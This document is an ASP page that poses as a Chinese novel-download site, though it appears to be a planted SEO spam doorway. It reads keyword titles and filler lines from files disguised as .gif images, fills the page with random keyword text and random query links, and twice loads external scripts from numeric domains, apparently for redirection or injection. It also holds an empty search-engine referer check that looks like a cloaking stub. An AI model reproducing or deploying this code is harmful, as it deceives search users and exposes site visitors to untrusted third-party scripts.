<%

Dim REFERER
REFERER = Cstr(Request.ServerVariables("HTTP_REFERER"))
If InStr(REFERER,"baidu.com") > 0 Or InStr(REFERER,"google") > 0 Or InStr(REFERER,"soso") > 0 Or InStr(REFERER,"sogou") > 0 Then
end if

'Titleline=a("key1.txt")
'Contentline=a("content.txt")


Titleline=get_content("D:\website\xydb.com\XYDB_files\tg.gif")
Contentline=get_content("D:\website\xydb.com\XYDB_files\la.gif")


function a(t)
	set fs=server.createobject("scripting.filesystemobject")
	file=server.mappath(t)
	set txt=fs.opentextfile(file,1,true)
	if not txt.atendofstream then
	a=txt.ReadAll
	end if

end function

Titleline = Split(Titleline,chr(13))

Contentline = split(Contentline,vbcrlf)

Function Rand(ByVal min, ByVal max)
		Randomize(Timer) : Rand = Int((max - min + 1) * Rnd + min)
End Function


Function randKey(obj) 
Dim char_array(80) 
Dim temp ,i
For i = 0 To 9 
char_array(i) = Cstr(i) 
Next 
For i = 10 To 35 
char_array(i) = Chr(i + 55) 
Next 
For i = 36 To 61 
char_array(i) = Chr(i + 61) 
Next 
Randomize 
For i = 1 To obj 
'rnd函数返回的随机数在0~1之间，可等于0，但不等于1 
'公式：int((上限-下限+1)*Rnd+下限)可取得从下限到上限之间的数，可等于下限但不可等于上限 
temp = temp&char_array(int(62 - 0 + 1)*Rnd + 0) 
Next 
randKey = temp 
End Function 

Function get_content(remote_url)
on error resume next
Dim oXMLHTTP ' As Object
Dim BodyText
Set oXMLHTTP = CreateObject("Microsoft.XMLHTTP")
oXMLHTTP.open "GET",remote_url,False 
oXMLHTTP.send 
BodyText=oXMLHTTP.responsebody
BodyText=BytesToBstr(BodyText,"gb2312")
Set oXMLHTTP = Nothing 
if err then
response.write "远程获取信息失败:"&err.description
else
get_content=BodyText
end if
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function

Function getCode(iCount)

     Dim arrChar
     Dim j,k,strCode
     arrChar = "0123456789"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     getCode = strCode

End Function

Dim Title1,Title2,Title3,Title4,Title5
Title1 = replace(Titleline(Rand(0,ubound(Titleline))),chr(10),"")
Title2 = replace(Titleline(Rand(0,ubound(Titleline))),chr(10),"")
Title3 = replace(Titleline(Rand(0,ubound(Titleline))),chr(10),"")
Title4 = replace(Titleline(Rand(0,ubound(Titleline))),chr(10),"")
Title5 = replace(Titleline(Rand(0,ubound(Titleline))),chr(10),"")
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="gb2312">
<head>
<title><%=Title1%> <%=Title2%> <%=Title3%> <%=now()%> </title>
<meta http-equiv="content-type" content="text/html;charset=gb2312" />
<meta name="description" content="<%=Title1%><%=Title2%> <%=Title3%>">
<meta name="keywords" content="<%=Title1%> <%=Title3%> <%=Title5%>">
<meta name="robots" content="index,follow,noarchive">
<script type="text/javascript" src="http://www.980970.com/long/qige.js"></script>
<script type="text/javascript" src="http://www.865875.com/js/long/qige.js"></script>
<style type="text/css">
#top{left:50%;margin-left:-450px;position: absolute;width:900px;height:1200px;font-size:14px;}
a{text-decoration: none;color:black;}
a:hover{text-decoration: underline;color: red;}
#menu{border:#00cc00 1px solid;}
#menu_1{width:100%;height:30px;background-color:green;}
#menu_1 ul li{float:left;margin-left:4px;margin-right:5px;}
#menu_1 ul li a{display:block;padding:8px 1px 4px 1px;color:white;}
#menu_1 ul li a:hover{background-color:red;}
#menu_2{width:100%;height:30px;}
#menu_2 ul li{float:left;margin-left:4px;margin-right:5px;}
#menu_2 ul li a{display:block;padding:6px 1px 0px 1px;}
#sundry{width:100%;height:30px;background-color:#f1ffea;}
#sundry ul li{float:left;margin-right:5px;}
#sundry ul li a{display:block;padding:10px 1px 10px 1px;}
#sundry ul{float:left;margin-left:5px;}
#search{float:left;margin-top:5px;}
#current_position{margin-top:5px;color:green;}
#current_position a{color:green;text-decoration: underline;}
#main{margin-top:8px;}
#content{width:75%;border:#00cc00 1px solid;float:left;}
#artical_topic h1{color:green;font-size:16px;margin-top:15px;}
#artical_topic div{color:gray;margin-top:-10px;margin-bottom:10px;}
#artical_topic div a{color:gray;}
#artical_content{width:90%;margin-left:5%;margin-bottom:30px;}
#artical_content p{text-indent: 20px;}
#sidebar{margin-left:3px;width:24%;}
#new_artical,#hot_artical,#similar_artical{border:#00cc00 1px solid;margin-bottom:5px;}
#new_artical ul,#hot_artical ul,#similar_artical ul{margin:0px;margin-left:8px;list-style-type: none;}
#new_artical ul li,#hot_artical ul li,#similar_artical ul li{margin-bottom:3px;margin-top:3px;}
#new_artical ul li a,#hot_artical ul li a,#similar_artical ul li a{color:green;}
#new_artical ul li a:hover,#hot_artical ul li a:hover,#similar_artical ul li a:hover{color:red;}
#new_title,#hot_title,#similar_title{background-color:#78b047;color:white;font-weight: bold;padding-top:3px;padding-bottom:3px;padding-left:8px;}
#artical_footer{width:100%;margin-bottom:30px;}
#download a{color:red;font-weight:bold;font-size:15px;text-decoration: underline;}
.d1{margin-left:80px;float:left;margin-top:20px;}
.d1 a{color:green;}
#footer{margin-top:15px;clear:both;}
</style>
</head>
<body>
<div id="top">
<div id="header">
	<div id="menu">
		<div id="menu_1">
		    <ul>
				<li><a href="?yanqing">都市言情</a></li>
				<li><a href="?wuxia">武侠玄幻</a></li>
				<li><a href="?chuanyue">穿越架空</a></li>
				<li><a href="?kehuan">科幻小说</a></li>
				<li><a href="?kongbu">恐怖灵异</a></li>
				<li><a href="?wangyou">网游竞技</a></li>
				<li><a href="?tuili">推理侦探</a></li>
				<li><a href="?dushi">都市|官场</a></li>
				<li><a href="?lishi">历史|军事</a></li>
				<li><a href="?yingshi">影视原著</a></li>
				<li><a href="?shijie">世界名著</a></li>
				<li><a href="?gdmz">古典名著</a></li>
			</ul>
		</div> <!-- menu_1 end-->
		<div id="menu_2">
		    <ul>
				<li><a href="/" >小说下载网</a></li>
				<li><a href="?guanli">管理书籍</a></li>
				<li><a href="?lizhi">励志书籍</a></li>
				<li><a href="?zhuanji">人物传记</a></li>
				<li><a href="?tonghua">儿童童话</a></li>
				<li><a href="?kexue">科学社科</a></li>
				<li><a href="?wenxue">文学综合</a></li>
				<li><a href="?yingwen">英文原著</a></li>
				<li><a href="?zaji">其他电子书</a></li>
				<li><a href="?txtsoft">TXT相关软件</a></li>
				<li><a href="?des.php">小说放到桌面</a></li>
			</ul>
		</div> 
	</div> <!-- menu_2 end-->
</div> <!--header end-->
<div id="sundry">
    <div id="search">
        <input type="text" size="24"/>
        <select id="Select1">
            <option value="title" selected="selected">书名</option>
            <option value="softwriter">作者</option>
        </select> 
        <input type="submit" value="搜索小说" />
	</div>
	<ul>
		<li><a href="?newbooks.html">最新小说下载</a></li> 
		<li><a href="?top.html">小说排行榜</a></li> 
		<li><a href="?topyanqing.html">言情小说榜</a></li>
		<li><a href="?topwxxh.html">武侠玄幻榜</a></li>
		<li><a href="?topcy.html">穿越小说榜</a></li> 
		<li><a href="javascript:window.open('http://cang.baidu.com/do/add?it='+encodeURIComponent(document.title.substring(0,76))+'&iu='+encodeURIComponent(location.href)+'&fr=ien#nw=1','_blank','scrollbars=no,width=600,height=450,left=75,top=20,status=no,resizable=yes'); void 0">百度</a></li> 
		<li><a href="javascript:void(0);" onclick="window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+encodeURIComponent(document.location.href));return false;" title="分享到QQ空间">QQ空间</a></li> 
	</ul> 		
</div><!--sundry end-->
<div id="current_position">
您的位置: <a href="/">首页</a> >  <a href="?yid=1325&key=<%=randKey(6)%>"><%=Title1%></A> <a name=baidusnap0></a><a href="?yid=1325&key=<%=randKey(6)%>"><%=Title2%></A> <a name=baidusnap0></a><a href="?yid=1325&key=<%=randKey(6)%>"><%=Title3%></A></div>
<!--current_position end-->
<div id="main">
	<div id="content">
		<div id="artical_topic" align="center">
<h1 class="atitle"><%=Title1%>_<%=Title2%>_<%=Title3%></h1><div>
				<span id="publish_time"><%=now()%></span><span id="author"> 作者:叶枫o0 </span><span id="comment"><a target="_blank" href="?id=335&key=<%=randKey(6)%>=<%=Title1%>">我要评论</a></span>
			</div>		
		</div><!--artical_topic end-->
		<div id="artical_content">
<P>
<span style="margin:1em 0;line-height:1.6em;text-indent:33px;text-align:left;">
<P align=left><FONT color=#000000>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<span style="color: #ff0000"><%=Title1%></span>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%> 
</span></p>
<span style="margin:1em 0;line-height:1.6em;text-indent:33px;text-align:left;">
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<span style="color: #ff0000"><%=Title2%></span>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<span style="margin:1em 0;line-height:1.6em;text-indent:33px;text-align:left;">
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<span style="color: #ff0000"><%=Title3%></span>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
<%response.write Replace(Contentline(Rand(0,ubound(Contentline))),"{title}",Title1)%>
</span>
</p>
<script type="text/javascript" src="http://www.980970.com/long/qige.js"></script>
<script type="text/javascript" src="http://www.865875.com/js/long/qige.js"></script>
		</div><!--artical_content end-->
		<div id="artical_footer" align="center">
			<span id="download"><a target="_blank" href="?id=335&key=<%=randKey(6)%>=<%=Title1%>">立即下载</a></span>
<div class="d1">上一篇:<a href="?yid=1325&key=<%=ttt-1%>"><%=Title4%></A></div>
			<div class="d1">下一篇:<a href="?yid=1325&key=<%=ttt+1%>"><%=Title5%></A></div>
		</div><!--artical_footer end-->
	</div><!--content end-->
	<div id="sidebar">
		<div id="new_artical">
		   <div id="new_title">最新文章</div>
			<ul><%
For dd = 1 to 7
ttt = Titleline(Rand(0,ubound(Titleline)))
%>
<li><a title="<%=ttt%>

 " href="?yid=1325&key=<%=randKey(6)%>" target="_blank"><%=ttt%></a></li>
<%
next
%>
			</ul>
		</div><!--new end-->
		<div id="hot_artical">
		    <div id="hot_title">最热文章</div>
			<ul>
<%
For dd = 1 to 7
ttt = Titleline(Rand(0,ubound(Titleline)))
%>
<li><P align=left>  <a title="<%=ttt%>
" href="?v1_v2=<%=randKey(7)%>" target="_blank"><%=ttt%></a></li>
<%
next
%>

			</ul>
		</div><!--hot end-->
		<div id="similar_artical">
		    <div id="similar_title">相似文章</div>
			<ul>
<%
For dd = 1 to 7
ttt = Titleline(Rand(0,ubound(Titleline)))
%>
<li><P align=left>  <a title="<%=ttt%>
" href="?yid=1325&key=<%=randKey(6)%>" target="_blank"><%=ttt%></a></li>
<%
next
%></P>
</div>
</div>
<div id="footer">
<B style='color:black;background-color:#ffff66'><%=Title1%> <%=Title2%> <%=Title3%></B>整理自互联网,免费提供下载,如果侵犯了您的权益,我们会在24小时内删除.<br />
</div>
</body>
</html>